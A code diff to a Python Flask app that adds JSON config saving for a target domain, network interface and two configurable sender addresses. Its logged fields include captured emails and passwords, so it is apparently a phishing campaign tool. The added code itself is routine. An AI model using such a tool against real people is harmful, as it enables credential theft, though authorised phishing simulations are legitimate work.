@@ -15,12 +15,27 @@ FIELDNAMES = ['ip_addr', 'email','password','user_agent','platform', 'date', 'st
 
 EMAIL_REGEX = r'(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)'
 
+CONFIG_FILE = 'config/config.json'
+
 STAGES = {
     'stage1': 1,
     'stage2': 2,
     'stage3': 3,
     'stage4': 4,
 }
+
+
+def manage_json(data):
+    try:
+        with open(CONFIG_FILE, 'r') as json_data:
+            file_json = json.load(json_data)
+    except:
+        file_json = {}
+
+    with open(CONFIG_FILE, 'w+') as json_data:
+        file_json.update(data)
+        json.dump(file_json, json_data)
+
 
 def check_stage(log_file, ip_addr):
     with open(log_file) as f:
@@ -97,8 +112,18 @@ def config():
 
         errors = validate(local_ip, email_address)
         if not errors:
+            data = {}
+            data['config'] = {
+                'local_ip': local_ip,
+                'iface': iface,
+                'target_domain': target_domain,
+                'email_address': email_address
+            }
+            
+            manage_json(data)
+
             return render_template(
-            'start.html',
+            'email.html',
             response=errors,
             name='config'
         )
@@ -113,7 +138,27 @@ def config():
 def email():
     errors = []
     if request.method == 'POST':
-        pass
+        from1 = request.form.get('from1', '')
+        from1_verbose = request.form.get('from1-verbose', '')
+        from2 = request.form.get('from2', '')
+        from2_verbose = request.form.get('from2-verbose', '')
+        
+        data = {}
+        data['email_config'] = {
+            'from1': from1,
+            'from1_verbose': from1_verbose,
+            'from2': from2,
+            'from2_verbose': from2_verbose,
+            # TODO: both body emails?
+        }
+
+        manage_json(data)
+
+        return render_template(
+            'start.html',
+            response=[],
+            name='start'
+        )
     
     return render_template(
         'email.html',
